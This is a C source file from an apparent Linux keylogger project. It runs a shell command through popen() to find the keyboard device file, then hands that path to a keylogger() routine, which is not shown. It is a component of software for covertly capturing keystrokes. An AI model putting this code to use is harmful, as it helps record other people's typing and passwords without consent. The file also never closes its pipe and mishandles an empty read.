#include <stdlib.h>
#include <stdio.h>  // popen()
#include <errno.h>  //errno
#include <string.h>  // strerror()

#include "../includes/keylogger.h"
#include "../includes/utils.h"

/*  Error management, print the function wish failed, the error number and the error message and exit with value of -1   */
void error(const char *expression)
{
    printf("ERROR : %s\nError Number : %d\nError Message : %s\n", expression, errno, strerror(errno));
    exit(-1);
}

void get_kb_device_filename(const char *command)
{
    char buffer[128] = "";
    char defaultPath[128] = "";
    char *deviceFile = NULL;

    FILE *pipe = NULL;

    /*  Open the pipe for execute the command line */
    pipe = popen(command, "r");
    if(pipe == NULL)
        error("popen()\nFonction : get_kb_device_filename()");

    /*  Put the result of the command in a buffer */
    if(fgets(buffer, 128, pipe) == NULL)
        error("fgets()\nFonction : get_kb_device_filename()");

    /*  Add the '\0' char of end of string */
    buffer[strlen(buffer) - 1] = 0;

    /* all this is only for finally strcpy in devicefile wish is a pointer, for use facilities programming. */
    strcat(defaultPath, buffer);

    deviceFile = malloc ((strlen (defaultPath) + 1) * sizeof (*deviceFile));
    if(deviceFile == NULL)
        error("malloc()\nFonction : get_kb_device_filename()");

    strcpy(deviceFile, defaultPath);

    /*  Send the deviceFile to the keylogger fonction */
    keylogger(deviceFile);

}

